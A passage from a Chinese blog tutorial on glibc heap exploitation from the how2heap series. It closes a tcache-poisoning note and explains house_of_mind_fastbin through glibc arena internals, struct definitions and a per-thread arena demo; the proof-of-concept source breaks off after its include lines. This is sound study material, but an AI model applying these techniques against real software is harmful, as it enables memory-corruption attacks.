<p>在从 tcache bin 取出 chunk 的检测中，不再是<code>tcache-&gt;entries[tc_idx] &gt; 0</code>，而是<code>tcache-&gt;counts[tc_idx] &gt; 0</code>，所以需要一个 pad chunk 填充<code>tcache-&gt;counts</code>数组，即一开始放入2个 chunk ，取出 chunk_b 后，tcache-&gt;counts值为1而不是0。<br>修改 chunk_b的 fd 指针为 target_addr，注意<code>PROTECT_PTR</code>保护。（前面部分有写）<br>第二个申请到的 chunk 就是 target_addr。</p>
<h2 id="house-of-mind-fastbin-glibc2-34"><a href="#house-of-mind-fastbin-glibc2-34" class="headerlink" title="house_of_mind_fastbin_glibc2.34"></a>house_of_mind_fastbin_glibc2.34</h2><h3 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h3><p>这个技术的核心是伪造 arena，欺骗程序在我们伪造的 arena 中分配内存。在了解这个技巧之前，我们需要先对 glibc 的arena有所了解。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/内存分配函数.png" alt><br>在多线程程序中，堆管理器需要保护堆结构。ptmalloc2引入了 arena 的概念。每个arena 本质上是完全不同的堆，他们独自管理自己的 chunk 和 bins。arena 分为 main arena 和 thread arena。glibc malloc 内部通过 brk() 和 mmap() 系统调用来分配内存。每个进程只有一个 main_arena（称为主分配区），但是可以有多个 thread arena（或者non_main_arena，非主分配区）。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/32位进程默认内存布局.png" alt><br><img src="/2022/04/18/how2heap深入浅出学习堆利用/64位进程默认内存布局.png" alt><br>可以看到，32位进程的默认内存布局中，mmap映射区域是从高地址向低地址增长，和栈的增长方式一样；而64位进程的默认内存布局中，mmap映射区域从低地址向高地址增长，和堆的增长方式一样。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set the end of accessible data space (aka "the break") to ADDR.</span></span><br><span class="line"><span class="comment">   Returns zero on success and -1 for errors (with errno set).  */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">brk</span> <span class="params">(<span class="keyword">void</span> *__addr)</span> __THROW __wur</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Increase or decrease the end of accessible data space by DELTA bytes.</span></span><br><span class="line"><span class="comment">   If successful, returns the address the previous end of data space</span></span><br><span class="line"><span class="comment">   (i.e. the beginning of the new space, if DELTA &gt; 0);</span></span><br><span class="line"><span class="comment">   returns (void *) -1 for errors (with errno set).  */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> *<span class="title">sbrk</span> <span class="params">(<span class="keyword">intptr_t</span> __delta)</span> __THROW</span>;</span><br></pre></td></tr></table></figure></p>
<p>堆初始化时固定start_brk（堆段开始）的值，然后通过 sbrk() 函数来确定顶部brk（堆段结束）的位置。<code>delta</code>为正数扩展brk，为负数则收缩brk。<br>在ASLR开启的时候，start_brk 和 brk 将等于data/bss 段的结尾加上随机 brk 偏移量。ASLR 关闭的时候，start_brk 和 brk 指向data/bss段的结尾。</p>
<p><strong>main_arena</strong><br>对应进程 heap 段，main_arena 由 brk() 函数创建。分配区信息由 malloc_state 结构体存储。main_arena的malloc_state 结构体存储在该进程链接的 libc.so 的数据段。main_arena 的大小可以扩展。<br><strong>thread_arena</strong><br>对应进程mmap段，thread arena 由 mmap() 函数创建。分配区信息由 malloc_state和heap_info两个结构体存储。thread_arena 的 malloc_state和heap_info存放在堆块的头部。thread_arena 的大小不可以扩展，用完之后重新申请一个 thread_arena。<br>达到限制后，多个进程将共同使用同一个 arena。<br>看一下两个结构体的定义：<br>（在后面调试还会具体查看）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure>
<p>heap_info 中有5个成员：</p>
<ol>
<li>ar_ptr<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">mstate</span>;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>指向所属 thread_arena 的 malloc_state 结构体的地址。</p>
<ol>
<li>prev<br>指向前一个 thread_arena heap。将 thread_arena heap 用单向链表连接起来。</li>
<li>size<br>所属 thread_arena heap 的大小，按照页（page）对齐。</li>
<li>mprotect_size<br>所属 thread_arena heap 中被读写保护的内存大小，也就是还没有被分配的内存大小。</li>
<li>pad<br>用于保证后面的数据对齐，尤其是 heap_info 是按照 MALLOC_ALIGNMENT 对齐的。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line">			  ? __alignof__ (<span class="keyword">long</span> <span class="keyword">double</span>) : <span class="number">2</span> * SIZE_SZ)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>SIZE_SZ 定义为<code>sizeof(size_t)</code>。size_t 的值依赖于平台，在我的ubuntu 18.04机器上，<code>sizeof(size_t)</code>的值是8 byte。分配的 chunk 都要按照<code>2*SIZE_SZ</code>也就是<code>MALLOC_ALIGNMENT</code>对齐，也是为了保证地址对齐，是一种牺牲空间换取时间的做法。<br>我在别的文章里看到：</p>
<blockquote>
<p>由于pad以上的成员大小加起来已经满足对齐要求，所以pad数组的大小为0即可(不管32位还是64位环境下，-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK算出来都是0，这里还没有理解为什么要写的这么奇怪)。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>里面定义的成员解释如下：</p>
<ol>
<li>mutex<br>防止不同线程同时使用同一个arena。</li>
<li>flags<br>记录了分配区的一些标志。</li>
<li>have_fastchunks<br>是否存在 fastbin chunks。</li>
<li>fastbinsY[NFASTBINS]<br>存储fast bin 链表头指针的数组。</li>
<li>top<br>指向 top chunk 的地址。</li>
<li>last_remainder<br>分配区上次分配时从一个 chunk 中切割剩余的 chunk，last_remainder 就是指向的这个 chunk。</li>
<li>bins[NBINS * 2 - 2]<br>存储所有unsorted bin、large bin、small bin的链表表头的数组。<br>详细内容指路《how2heap深入浅出学习堆利用（一）》-&gt; 前置知识 -&gt; 空闲 chunk 管理器。</li>
<li>binmap[BINMAPSIZE]<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment">    To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment">    structure is used for bin-by-bin searching.  `binmap' is a</span></span><br><span class="line"><span class="comment">    bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment">    be skipped over during during traversals.  The bits are NOT always</span></span><br><span class="line"><span class="comment">    cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment">    when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp;= ~(idx2bit (i)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block (i)] &amp; idx2bit (i))</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>binmap数组以一个bit来记录当前的bin是否为空，也就是是否有空闲chunk。</p>
<ol>
<li><code>*next</code><br>指向下一个分配区，将进程所有的分配区以单链表连起来。</li>
<li><code>*next_free</code><br>将进程的下一个空闲的分配区（也就是没有被任何线程使用的分配区）链接在单向链表中，只有在定义了 PER_THREAD 的情况下才定义该字段。</li>
<li>attached_threads<br>使用当前分配区的线程数量。</li>
<li>system_mem<br>所属分配区已经分配的内存大小。</li>
<li>max_system_mem<br>所属分配区能分配的最大内存大小。<br>main_arena、thread_arena和multi_thread_arena示意图如下：<br>图片来源：<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a><br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mind_arena1.png" alt><br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mind_arena2.png" alt><br>arena最大数量由内核数量决定。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores.</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>per thread arena示例。程序来源：<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;3</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After free in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to per thread arena example::%d\n"</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After free in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Thread creation error\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Thread join error\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o mthread mthread.c -lpthread</span><br></pre></td></tr></table></figure></p>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/procmaps1.png" alt><br>在分配之前，程序初始化出了一块<code>0x5637b467a000-0x5637b469b000</code>共 0x21000（132 * 1024）大小的内存，作为初始的堆，初始堆有 132kb 的可读可写区，再申请的时候，可以从这132kb 的空间中申请，直到用完。用完之后可以继续扩展 brk 的位置。同样，当 top chunk 上有足够大的内存时，brk 的值也会缩小。<br>申请一块 1000 byte 大小的chunk，这块chunk会从heap段中获取，释放也不会直接归还系统，而是分情况讨论。如果与top chunk物理相邻，就会合并进 top chunk，没有物理相邻则会进入对应的bin中。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/procmaps2.png" alt><br><img src="/2022/04/18/how2heap深入浅出学习堆利用/procmaps3.png" alt><br>在 thread1进行malloc之前，映射了一块区域，我不知道这个是在干嘛，有师傅知道可以教教我。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/procmaps4.png" alt><br><img src="/2022/04/18/how2heap深入浅出学习堆利用/procmaps5.png" alt><br>而在 thread1进行malloc之后，由于非主分配区只能访问进程的mmap映射区域，调用mmap函数向系统申请<code>HEAP_MAX_SIZE</code>大小的内存，在32位机器上是1M，64位机器是64M。这64M的堆内存被映射进进程mmap映射段的地址空间。这64M中仅有132kb的可读可写区，称为这个线程的堆内存，也就是thread arena。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> info macro HEAP_MAX_SIZE</span><br><span class="line">Defined at /home/pukrquq/Downloads/glibc-2.34/malloc/arena.c:32</span><br><span class="line">  included at /home/pukrquq/Downloads/glibc-2.34/malloc/malloc.c:2013</span><br><span class="line"><span class="meta">#</span>define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line"><span class="meta">pwndbg&gt;</span> info macro DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">Defined at /home/pukrquq/Downloads/glibc-2.34/malloc/malloc.c:978</span><br><span class="line"><span class="meta">#</span>define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long))</span><br></pre></td></tr></table></figure>
<p>注意：当用户请求大小超过 128 KB，并且当 arena 中没有足够的空间来满足用户请求时，使用 mmap 系统调用（而不是使用 sbrk()函数）分配内存，不管请求是从 main arena 还是 thread arena 发出的。如果小于128kb，则main_arena会使用sbrk()函数来扩展heap段。如果是main_arena 调用 mmap函数分配内存，当 free 该内存时，主分配区会直接调用 munmap()将该内存归还给系统。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/procmaps6.png" alt><br>thread1 free掉内存之后，放入对应的thread arena bins中。</p>
<p>了解了这些之后，可以重新认识我们的 house_of_mind_fastbin了。<br>这个技术就在于伪造一个 arena，然后不断增加 brk 的值来扩展堆段，再修改 chunk 的 non_main_arena标志位。那么再次 free 的时候，这块 fast bin chunk 就会进入我们伪造的 arena 的fast bin中了。下面可以调试看看。</p>
<h3 id="POC-13"><a href="#POC-13" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 